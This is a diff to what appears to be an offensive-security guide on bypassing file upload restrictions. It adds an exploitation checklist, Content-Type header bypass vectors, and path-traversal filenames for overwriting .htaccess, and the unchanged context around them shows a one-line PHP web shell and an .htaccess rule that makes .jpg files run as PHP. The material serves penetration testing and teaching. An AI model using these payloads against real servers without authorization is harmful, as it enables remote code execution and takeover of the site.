@@ -10,6 +10,23 @@ File upload vulnerabilities allow attackers to upload files that are:
 - Used to exploit server-side parsers (XXE via XML, DoS via decompression bomb)
 - Placed in attacker-controlled paths (path traversal in filename)
 
+## PRE-EXPLOITATION CHECKLIST
+
+Before testing bypasses, verify two prerequisites for RCE/XSS impact:
+
+1. **File is retrievable** — you must be able to access the uploaded file via URL.
+   If the app stores files in a private bucket/path with no public URL, execution is blocked.
+   (Path traversal to web root can still work — see below.)
+
+2. **Content-Type is not force-overridden** — if the server serves all uploaded files as
+   `application/octet-stream`, the browser/server won't execute PHP or render XSS.
+   Test: upload a `.php` file and check the response `Content-Type` when fetching it.
+
+**Blacklist vs. whitelist detection:**
+Upload a file with a completely random extension (e.g. `test.xyzabc123`).
+- Accepted → the app uses a **blacklist** (easier to bypass with alt extensions)
+- Rejected → likely a **strict whitelist** (harder; focus on parser confusion / regex evasion)
+
 ## WHITEBOX PATTERNS
 
 ```bash
@@ -57,6 +74,12 @@ Content-Type: image/jpeg
 <?php system($_GET['cmd']); ?>
 ```
 
+Additional Content-Type bypass vectors (try each):
+- Send **multiple** Content-Type values: `Content-Type: application/x-php, image/png`
+- **Remove** the Content-Type header entirely from the multipart part
+- Whitelisted filename + malicious Content-Type: `filename="shell.png"` + `Content-Type: application/x-php`
+- Malicious filename + whitelisted Content-Type: `filename="shell.php"` + `Content-Type: image/png`
+
 ### Magic bytes bypass (server reads first bytes to detect file type)
 ```bash
 # Prepend a valid image magic bytes to PHP shell:
@@ -89,6 +112,13 @@ cat > .htaccess << 'EOF'
 AddType application/x-httpd-php .jpg
 EOF
 # Then upload shell.jpg — Apache executes it as PHP
+
+# If filename is not sanitized, use path traversal to place .htaccess
+# in the upload directory or a parent directory:
+# filename: "../.htaccess"
+# filename: "../../.htaccess"
+# filename: "%2e%2e%2f.htaccess"
+# This overwrites the existing .htaccess and changes execution rules for that directory
 ```
 
 ### SVG XSS
